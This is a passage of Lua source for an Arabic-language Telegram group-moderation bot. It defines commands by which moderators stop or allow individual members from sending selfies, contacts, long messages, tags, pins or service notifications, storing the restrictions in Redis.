if text and text:match('^قفل السيلفي @(.*)') and is_mod(msg) then     local username = text:match('قفل السيلفي @(.*)')     function kick_username(extra,result,success)     if result.id_ then      if tonumber(result.id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     else     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     tahadevstorm:incrby('numlockself'..msg.chat_id_..result.id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockself:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال السيلفي'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end end end     saddbyusername(username,kick_username)     end
if text == 'فتح السيلفي' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     tahadevstorm:del('numlockself'..msg.chat_id_..result.sender_user_id_)    tahadevstorm:srem(DEVSTOR..'lockself:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن السيلفي'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end      getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end
if text and text:match('^فتح السيلفي (%d+)') and is_mod(msg)  then     local user = text:match('فتح السيلفي (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    tahadevstorm:del('numlockself'..msg.chat_id_..user)    tahadevstorm:srem(DEVSTOR..'lockself:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن السيلفي'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     getUser(user, bot_kick)    end
if text and text:match('^فتح السيلفي @(.*)') and is_mod(msg) then     local username = text:match('فتح السيلفي @(.*)')     function kick_username(extra,result,success)     if result.id_ then      tahadevstorm:del('numlockself'..msg.chat_id_..result.id_)    tahadevstorm:srem(DEVSTOR..'lockself:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن السيلفي'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end      end     saddbyusername(username,kick_username)     end
if text == 'قفل الجهات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")     else     if tonumber(result.sender_user_id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.sender_user_id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockphon'..msg.chat_id_..result.sender_user_id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockphon:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الجهات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end
if text and text:match('^قفل الجهات (%d+)') and is_mod(msg)  then     local user = text:match('قفل الجهات (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     if tonumber(user) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,user) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     return false  end       tahadevstorm:incrby('numlockphon'..msg.chat_id_..user,10000000)    tahadevstorm:sadd(DEVSTOR..'lockphon:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الجهات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end getUser(user, bot_kick) end     
if text and text:match('^قفل الجهات @(.*)') and is_mod(msg) then     local username = text:match('قفل الجهات @(.*)')     function kick_username(extra,result,success)     if result.id_ then      if tonumber(result.id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     else     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     tahadevstorm:incrby('numlockphon'..msg.chat_id_..result.id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockphon:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الجهات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end end end     saddbyusername(username,kick_username)     end
if text == 'فتح الجهات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     tahadevstorm:del('numlockphon'..msg.chat_id_..result.sender_user_id_)    tahadevstorm:srem(DEVSTOR..'lockphon:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الجهات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end      getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end    
if text and text:match('^فتح الجهات (%d+)') and is_mod(msg)  then     local user = text:match('فتح الجهات (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    tahadevstorm:del('numlockphon'..msg.chat_id_..user)    tahadevstorm:srem(DEVSTOR..'lockphon:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الجهات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end    getUser(user, bot_kick)    end
if text and text:match('^فتح الجهات @(.*)') and is_mod(msg) then     local username = text:match('فتح الجهات @(.*)')     function kick_username(extra,result,success)     if result.id_ then      tahadevstorm:del('numlockphon'..msg.chat_id_..result.id_)    tahadevstorm:srem(DEVSTOR..'lockphon:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الجهات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end      end     saddbyusername(username,kick_username)     end
if text == 'قفل الكلايش' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")     else     if tonumber(result.sender_user_id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.sender_user_id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockspmkl'..msg.chat_id_..result.sender_user_id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockspmkl:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الكلايش'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end    
if text and text:match('^قفل الكلايش (%d+)') and is_mod(msg)  then     local user = text:match('قفل الكلايش (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     if tonumber(user) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,user) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     return false  end       tahadevstorm:incrby('numlockspmkl'..msg.chat_id_..user,10000000)    tahadevstorm:sadd(DEVSTOR..'lockspmkl:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الكلايش'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end getUser(user, bot_kick) end
if text and text:match('^قفل الكلايش @(.*)') and is_mod(msg) then     local username = text:match('قفل الكلايش @(.*)')     function kick_username(extra,result,success)     if result.id_ then      if tonumber(result.id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     else     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     tahadevstorm:incrby('numlockspmkl'..msg.chat_id_..result.id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockspmkl:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الكلايش'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end end end     saddbyusername(username,kick_username)     end        
if text == 'فتح الكلايش' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     tahadevstorm:del('numlockspmkl'..msg.chat_id_..result.sender_user_id_)    tahadevstorm:srem(DEVSTOR..'lockspmkl:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الكلايش'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end      getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end         
if text and text:match('^فتح الكلايش (%d+)') and is_mod(msg)  then   local user = text:match('فتح الكلايش (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:del('numlockspmkl'..msg.chat_id_..user)  tahadevstorm:srem(DEVSTOR..'lockspmkl:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الكلايش'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end   getUser(user, bot_kick)  end
if text and text:match('^فتح الكلايش @(.*)') and is_mod(msg) then   local username = text:match('فتح الكلايش @(.*)')   function kick_username(extra,result,success)   if result.id_ then    tahadevstorm:del('numlockspmkl'..msg.chat_id_..result.id_)  tahadevstorm:srem(DEVSTOR..'lockspmkl:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الكلايش'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end  end   saddbyusername(username,kick_username)   end
if text == 'قفل التاك' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")   else   if tonumber(result.sender_user_id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.sender_user_id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')  return false  end    tahadevstorm:incrby('numlockhash'..msg.chat_id_..result.sender_user_id_,160000066)  tahadevstorm:sadd(DEVSTOR..'lockhash:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال التاك'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end
if text and text:match('^قفل التاك (%d+)') and is_mod(msg)  then   local user = text:match('قفل التاك (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   if tonumber(user) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,user) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockhash'..msg.chat_id_..user,10000000)  tahadevstorm:sadd(DEVSTOR..'lockhash:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال التاك'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end getUser(user, bot_kick) end   
if text and text:match('^قفل التاك @(.*)') and is_mod(msg) then   local username = text:match('قفل التاك @(.*)')   function kick_username(extra,result,success)   if result.id_ then    if tonumber(result.id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   else   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   tahadevstorm:incrby('numlockhash'..msg.chat_id_..result.id_,160000066)  tahadevstorm:sadd(DEVSTOR..'lockhash:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال التاك'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end end end   saddbyusername(username,kick_username)   end
if text == 'فتح التاك' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   tahadevstorm:del('numlockhash'..msg.chat_id_..result.sender_user_id_)  tahadevstorm:srem(DEVSTOR..'lockhash:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التاك'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end    
if text and text:match('^فتح التاك (%d+)') and is_mod(msg)  then   local user = text:match('فتح التاك (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:del('numlockhash'..msg.chat_id_..user)  tahadevstorm:srem(DEVSTOR..'lockhash:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التاك'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end   getUser(user, bot_kick)  end
if text and text:match('^فتح التاك @(.*)') and is_mod(msg) then   local username = text:match('فتح التاك @(.*)')   function kick_username(extra,result,success)   if result.id_ then    tahadevstorm:del('numlockhash'..msg.chat_id_..result.id_)  tahadevstorm:srem(DEVSTOR..'lockhash:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التاك'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    end   saddbyusername(username,kick_username)   end  
if text == 'قفل التثبيت' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")   else   if tonumber(result.sender_user_id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.sender_user_id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')  return false  end    tahadevstorm:incrby('numlockpinmsg'..msg.chat_id_..result.sender_user_id_,160000066)  tahadevstorm:sadd(DEVSTOR..'lockpinmsg:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن التثبيت'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end  
if text and text:match('^قفل التثبيت (%d+)') and is_mod(msg)  then   local user = text:match('قفل التثبيت (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   if tonumber(user) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,user) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockpinmsg'..msg.chat_id_..user,10000000)  tahadevstorm:sadd(DEVSTOR..'lockpinmsg:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن التثبيت'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end getUser(user, bot_kick) end   
if text and text:match('^قفل التثبيت @(.*)') and is_mod(msg) then   local username = text:match('قفل التثبيت @(.*)')   function kick_username(extra,result,success)   if result.id_ then  if tonumber(result.id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end  if storm3(msg.chat_id_,result.id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   else   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   tahadevstorm:incrby('numlockpinmsg'..msg.chat_id_..result.id_,160000066)  tahadevstorm:sadd(DEVSTOR..'lockpinmsg:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن التثبيت'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end end  end saddbyusername(username,kick_username)   end 
if text == 'فتح التثبيت' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   tahadevstorm:del('numlockpinmsg'..msg.chat_id_..msg.chat_id_..result.sender_user_id_)  tahadevstorm:srem(DEVSTOR..'lockpinmsg:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التثبيت'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end    getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end
if text and text:match('^فتح التثبيت (%d+)') and is_mod(msg)  then   local user = text:match('فتح التثبيت (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:del('numlockpinmsg'..msg.chat_id_..user)  tahadevstorm:srem(DEVSTOR..'lockpinmsg:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التثبيت'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end   getUser(user, bot_kick)  end   
if text and text:match('^فتح التثبيت @(.*)') and is_mod(msg) then   local username = text:match('فتح التثبيت @(.*)')   function kick_username(extra,result,success)   if result.id_ then    tahadevstorm:del('numlockpinmsg'..msg.chat_id_..result.id_)  tahadevstorm:srem(DEVSTOR..'lockpinmsg:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التثبيت'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    end   saddbyusername(username,kick_username)   end
if text == 'قفل الاشعارات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")   else   if tonumber(result.sender_user_id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.sender_user_id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')  return false  end    tahadevstorm:incrby('numlocktgser'..msg.chat_id_..result.sender_user_id_,160000066)  tahadevstorm:sadd(DEVSTOR..'locktgser:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الاشعارات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end
if text and text:match('^قفل الاشعارات (%d+)') and is_mod(msg)  then   local user = text:match('قفل الاشعارات (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   if tonumber(user) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,user) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlocktgser'..msg.chat_id_..user,10000000)  tahadevstorm:sadd(DEVSTOR..'locktgser:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الاشعارات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end getUser(user, bot_kick) end   
if text and text:match('^قفل الاشعارات @(.*)') and is_mod(msg) then   local username = text:match('قفل الاشعارات @(.*)')   function kick_username(extra,result,success)   if result.id_ then    if tonumber(result.id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   else   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   tahadevstorm:incrby('numlocktgser'..msg.chat_id_..result.id_,160000066)  tahadevstorm:sadd(DEVSTOR..'locktgser:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الاشعارات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end end end   saddbyusername(username,kick_username)   end
